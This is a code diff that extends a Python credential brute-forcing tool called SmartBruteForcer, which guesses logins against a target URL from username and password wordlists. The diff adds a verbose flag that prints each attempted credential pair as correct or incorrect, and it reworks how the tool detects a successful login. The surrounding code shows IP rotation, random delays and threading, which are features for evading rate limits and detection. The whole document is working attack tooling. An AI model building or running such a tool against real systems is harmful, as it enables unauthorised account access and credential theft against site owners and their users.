@@ -115,6 +115,7 @@ class SmartBruteForcer:
         self.attempts = 0
         self.successful = False
         self.result = None
+        self.verbose = config.get('verbose', False)
         
         if config.get('headers'):
             self.session.headers.update(config['headers'])
@@ -163,35 +164,34 @@ class SmartBruteForcer:
             
             with self.lock:
                 self.attempts += 1
-                if self.attempts % 10 == 0:
-                    logger.info(f"Progress: {self.attempts} attempts made.")
-            
+                
             success_indicators = self.config.get('success_indicators', [])
             failure_indicators = self.config.get('failure_indicators', [])
             
+            is_success = False
             for indicator in success_indicators:
                 if indicator in response.text:
-                    logger.info(f"SUCCESS! Credentials found -> {username}:{password}")
-                    return True, {
-                        'username': username,
-                        'password': password,
-                        'response': response.text[:200],
-                        'status_code': response.status_code
-                    }
+                    is_success = True
+                    break
             
-            for indicator in failure_indicators:
-                if indicator in response.text:
-                    return False, {}
-            
-            # Success detection via status codes or redirection logic
-            if response.status_code in [301, 302, 303, 307, 308] or ('dashboard' in response.url.lower()):
-                 logger.info(f"SUCCESS! Redirection detected -> {username}:{password}")
-                 return True, {
-                        'username': username,
-                        'password': password,
-                        'url': response.url,
-                        'status_code': response.status_code
-                    }
+            if not is_success:
+                # Success detection via status codes or redirection logic
+                if response.status_code in [301, 302, 303, 307, 308] or ('dashboard' in response.url.lower()):
+                     is_success = True
+
+            if self.verbose:
+                status = "[CORRECT]" if is_success else "[INCORRECT]"
+                # Format: url - username - password - [incorrect/correct]
+                print(f"{self.config['target_url']} - {username} - {password} - {status}")
+
+            if is_success:
+                logger.info(f"SUCCESS! Credentials found -> {username}:{password}")
+                return True, {
+                    'username': username,
+                    'password': password,
+                    'response': response.text[:200] if not ('dashboard' in response.url.lower()) else "Redirection",
+                    'status_code': response.status_code
+                }
 
             return False, {}
             
@@ -277,6 +277,7 @@ def get_cli_input():
     
     rotate_interval = int(input("\n[4] IP rotation interval (seconds, 0 to disable): ").strip() or "0")
     threads = int(input("[5] Threads (default 3): ").strip() or "3")
+    verbose = input("[6] Enable verbose output? (y/N): ").lower() == 'y'
     
     config = {
         "target_url": target_url,
@@ -287,7 +288,8 @@ def get_cli_input():
         "failure_indicators": ["invalid", "error"],
         "min_delay": 1.0,
         "max_delay": 5.0,
-        "timeout": 30
+        "timeout": 30,
+        "verbose": verbose
     }
     
     return {
@@ -310,6 +312,7 @@ def main():
     parser.add_argument('-r', '--rotate-interval', type=int, default=0, help='IP rotation (secs)')
     parser.add_argument('-c', '--config', default='bruteforce_config.json', help='Config file')
     parser.add_argument('-t', '--threads', type=int, default=3, help='Threads')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output (show every attempt)')
     
     args = parser.parse_args()
     
@@ -335,6 +338,7 @@ def main():
         passwords = load_list(args.wordlist, "passwords")
         rotate_interval = args.rotate_interval
         threads = args.threads
+        config['verbose'] = args.verbose
 
     if not usernames or not passwords or not config.get('target_url'):
         logger.error("Missing required parameters (URL, Users, Passwords).")
